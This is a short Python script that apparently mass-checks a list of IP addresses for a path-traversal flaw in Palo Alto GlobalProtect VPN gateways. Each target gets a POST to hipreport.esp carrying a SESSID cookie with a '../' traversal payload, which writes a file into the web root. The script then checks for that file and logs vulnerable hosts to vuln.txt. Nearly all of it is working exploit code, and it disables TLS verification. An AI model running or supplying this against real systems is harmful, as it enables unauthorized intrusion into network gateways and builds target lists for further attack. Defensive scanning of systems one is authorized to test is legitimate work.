import requests
from requests.exceptions import ConnectionError
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def connect(ip):
    connect_one = f"https://{ip}/ssl-vpn/hipreport.esp"
    connect_two = f"https://{ip}/global-protect/portal/images/poc.txt"

    try:
        
        first_response = requests.post(connect_one, headers={"Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt;", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "0"}, verify=False)
        
        
        if first_response.status_code == 200:
            
            second_response = requests.get(connect_two, verify=False)

            
            if second_response.status_code == 403:
                print(f"IP {ip} is VULNERABLE!!!")
                # Write the vulnerable IP to a new file
                with open('vuln.txt', 'a') as f:
                    f.write(ip + '\n')
            elif second_response.status_code == 404:
                print(f"IP {ip} is NOT VULNERABLE")
            else:
                print(f"Unexpected status code {second_response.status_code} for IP {ip}")
        else:
            print(f"First request failed for IP {ip}, status code: {first_response.status_code}")
    except ConnectionError as e:
        print(f"Connection error occurred for IP {ip}: {e}")

def main(input_file):
    with open(input_file, 'r') as f:
        for line in f:
            ip = line.strip()
            connect(ip)

if __name__ == "__main__":
    input_file = input("Enter List of hosts(IP(s)): ")
    main(input_file)
